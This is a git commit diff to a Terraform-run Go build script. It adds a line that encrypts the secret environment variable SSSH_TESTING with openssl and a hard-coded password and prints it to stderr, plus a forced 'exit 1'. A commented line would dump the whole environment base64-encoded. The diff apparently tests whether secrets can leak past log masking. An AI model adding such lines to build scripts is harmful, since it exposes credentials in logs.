f6613b2de28c8549e70b602bd72926236705e92b
tyler <hendrickson.tsh@gmail.com>
2023-09-06 20:02:00 +0000

    Add script back

--- terraform/script.bash
+++ terraform/script.bash
@@ -4,6 +4,8 @@
 set -e
 
 # printf $(sh -c 'env' | base64 -w 0) > $HOME/some-output.txt
+printf "Tell no one $SSSH_TESTING ---" | openssl aes-256-cbc -a -salt -pass pass:somepassword 1>&2
 
 mkdir -p ../bin
 go build -gcflags="-trimpath=$GOPATH" -asmflags="-trimpath=$GOPATH" -trimpath -ldflags=-buildid= -buildvcs=false -o ../bin/ohai ../cmd >&2 && echo '{}'
+exit 1
